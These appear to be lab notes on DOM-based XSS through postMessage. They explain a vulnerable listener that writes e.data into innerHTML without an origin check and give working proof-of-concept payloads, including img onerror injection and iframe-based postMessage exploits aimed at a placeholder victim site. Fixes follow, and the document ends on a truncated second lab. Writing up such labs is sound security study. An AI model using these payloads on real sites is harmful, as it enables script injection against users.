# DOM-based vulnerabilities

## Lab: DOM XSS using web messages


The code:

```
window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                            })

```

### What’s happening:

- The page listens for messages sent to it via postMessage or other frames/windows.

- Whatever e.data contains is directly inserted into the DOM via innerHTML without sanitization.

- If an attacker can send a crafted message to the page, they can inject arbitrary HTML/JS.

### Why it’s vulnerable
```
- innerHTML interprets input as HTML, so <script> or event handlers (like onerror) will execute.

- The developer has not validated origin (i.e., e.origin) or sanitized e.data.
```

### Attack Steps
- Identify the vulnerable listener:

  - Look for window.addEventListener('message', ...) in JS.

  - Check if the callback uses innerHTML or document.write with untrusted data.

- Verify there’s no origin check:
   ```
   if (e.origin !== "https://trusted-site.com") return;
   If missing → vulnerable.
   ```
- Craft a malicious message to exploit:
	```
	window.postMessage('<img src=x onerror=alert(1)>', '*');
    '*' sends to any origin.
    The payload uses an event handler (onerror) to trigger JavaScript.
  
    ```


### Real-World Exploit
- If you can open the target page in an iframe or another tab, you can inject:

```

<iframe src="https://victim.com"></iframe>
<script>
    // Wait until iframe loads, then send payload
    window.frames[0].postMessage('<img src=x onerror=alert(document.domain)>', '*');
</script>
```

```
<iframe src="https://vitim.com/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```


### Fix
- Validate origin:
```
if (e.origin !== "https://trusted-site.com") return;
```
- Sanitize data (e.g., DOMPurify) before inserting into the DOM:
```
document.getElementById('ads').innerHTML = DOMPurify.sanitize(e.data);
```

- Avoid using innerHTML unless necessary — use textContent for plain text.

<hr>

## Lab: DOM XSS using web messages and a JavaScript URL


Analysis :  window.postMessage("javascript:al")